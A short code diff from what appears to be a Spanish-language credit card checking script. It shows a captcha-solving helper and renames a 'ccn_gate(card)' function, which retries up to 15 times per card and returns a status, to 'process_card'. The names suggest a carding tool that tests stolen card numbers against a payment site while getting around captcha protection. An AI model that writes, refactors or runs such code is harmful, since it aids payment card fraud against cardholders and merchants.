@@ -84,7 +84,7 @@ async def resolver_captcha(api_key, sitekey, url):
 
     except Exception as e:
         raise Exception(f'Error al resolver el captcha: {str(e)}')
-def ccn_gate(card):
+async def process_card(card: str) -> str:
     max_retries = 15
     retry_count = 0
     while retry_count < max_retries:
@@ -440,4 +440,5 @@ def ccn_gate(card):
     else:
 
         return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
+
 
